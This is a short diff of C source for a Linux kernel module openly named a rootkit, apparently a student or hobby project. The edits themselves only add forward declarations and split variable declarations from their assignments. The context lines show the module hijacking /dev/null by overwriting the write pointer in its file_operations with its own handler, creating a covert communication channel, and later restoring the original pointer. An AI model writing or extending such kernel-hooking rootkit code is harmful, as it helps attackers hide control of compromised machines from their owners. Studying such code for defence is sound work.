@@ -6,6 +6,11 @@
 MODULE_LICENSE("MIT");
 MODULE_AUTHOR("SAV");
 
+int establish_comm_channel();
+int unestablish_comm_channel();
+ssize_t *cns_rootkit_dev_null_write(struct file *, char __user *, size_t, loff_t *);
+
+
 ssize_t (*original_dev_null_write) (struct file *, char __user *, size_t, loff_t *);
 
 ssize_t *cns_rootkit_dev_null_write(struct file *filep, char __user *buf, size_t count, loff_t *p) {
@@ -20,7 +25,8 @@ int establish_comm_channel() {
     return -1;
   }
 
-  struct file_operations *dev_null_fop = dev_null_file->f_op;
+  struct file_operations *dev_null_fop;
+  dev_null_fop = dev_null_file->f_op;
   filp_close(dev_null_file, 0);
 
   original_dev_null_write = dev_null_fop->write;
@@ -37,7 +43,8 @@ int unestablish_comm_channel() {
     return -1;
   }
 
-  struct file_operations *dev_null_fop = dev_null_file->f_op;
+  struct file_operations *dev_null_fop;
+  dev_null_fop = dev_null_file->f_op;
   filp_close(dev_null_file, 0);
 
   dev_null_fop->write = original_dev_null_write;
